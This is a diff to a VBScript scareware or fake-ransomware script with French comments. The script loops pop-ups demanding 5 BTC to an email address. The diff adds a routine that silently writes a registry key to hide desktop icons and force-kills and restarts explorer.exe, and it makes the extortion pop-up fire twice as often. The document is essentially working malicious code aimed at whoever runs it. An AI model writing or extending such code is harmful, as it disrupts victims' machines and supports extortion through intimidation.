@@ -38,11 +38,20 @@ Sub SetWallpaper()
     End If
 End Sub
 
+Sub HideDesktopIcons()
+    On Error Resume Next
+    objShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideIcons", 1, "REG_DWORD"
+    objShell.Run "taskkill /F /IM explorer.exe", 0, True
+    objShell.Run "explorer.exe", 0, True
+End Sub
+
 ' Appliquer immédiatement le fond d'écran
 SetWallpaper
+HideDesktopIcons
 
 ' Boucle pour afficher une pop-up toutes les secondes
 Do
     objShell.Popup "Merci d'envoyer 5btc a l'addres suivant wypii@yogurt.com", 1, "Alerte", 48
-    WScript.Sleep 1000
+    WScript.Sleep 500
+    
 Loop
